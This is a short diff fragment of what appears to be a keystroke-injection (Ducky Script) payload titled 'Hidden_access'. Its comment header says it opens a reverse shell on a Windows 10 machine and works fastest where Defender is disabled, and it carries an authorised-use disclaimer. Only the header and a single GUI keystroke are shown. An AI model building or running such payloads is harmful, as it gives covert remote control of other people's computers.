@@ -1,4 +1,3 @@
-
 REM Author: makozort Title: Hidden_access Target: windows 10 Description: gain a reverse shell to targets pc, the script works VERY qucikly agains machines with disabled defender
 REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
 GUI
